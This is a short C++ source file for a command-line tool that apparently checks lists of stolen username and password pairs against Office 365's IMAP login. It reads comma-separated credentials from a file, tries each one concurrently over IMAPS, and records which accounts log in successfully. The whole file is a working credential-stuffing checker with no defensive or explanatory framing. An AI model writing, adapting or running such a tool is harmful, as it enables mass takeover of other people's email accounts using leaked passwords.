#include <string>
#include <iostream>
#include "curl.h"
#include "c_clip.h"
#include <fstream>
#include <iterator>
#include <sstream>
#include <vector>
#include <future>


int main(int argc, char* argv[]) {

	if (argc != 3) {
		std::cout << "Usage: c_clip [SOURCE_FILE] [RESULTS_FILE]";
		return 0;
	}

	std::string infile = argv[1];
	std::string outfile = argv[2];

	clipCheckFile(infile, outfile);

}

size_t curl_devnull(char* ptr, size_t size, size_t nmemb, void* userdata) {
	return size * nmemb;
}

std::string imap_check(const std::string& username, const std::string& password)
{
	CURL* curl;
	CURLcode res = CURLE_OK;

	curl = curl_easy_init();

	std::string result = "false-" + username;

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, "imaps://outlook.office365.com");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_devnull);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);

		res = curl_easy_perform(curl);

		if (res == CURLE_OK)
		{
			result = "true-" + username;
		}

		curl_easy_cleanup(curl);
	}

	return result;
}

void clipCheckFile(const std::string& in_file, const std::string& out_file) {

	std::ifstream in(in_file.c_str());
	std::vector<std::string> vecOfAccounts;

	std::string str;
	while (std::getline(in, str)) {
		if (str.size() > 0)
			vecOfAccounts.push_back(str);
	}

	std::vector<std::future<std::string>> futures;

	for (std::string account : vecOfAccounts)
	{
		const char delim = ',';

		std::vector<std::string> out;
		tokenize(account, delim, out);

		std::string user = out[0];
		std::string pass = out[1];

		futures.push_back(std::async(imap_check, user, pass));
	}

	std::vector<std::string> vecOfResults;

	for (auto& e : futures) {
		vecOfResults.push_back(e.get());
	}

	std::ofstream file2;
	file2.open(out_file);
	for (int i = 0; i < vecOfResults.size(); ++i) {
		file2 << vecOfResults[i] << std::endl;
	}
	file2.close();

	std::cout << "finished" << std::endl;

}

void tokenize(const std::string& str, const char delim, std::vector<std::string>& out) {
	size_t start;
	size_t end = 0;

	while ((start = str.find_first_not_of(delim, end)) != std::string::npos)
	{
		end = str.find(delim, start);
		out.push_back(str.substr(start, end - start));
	}
}
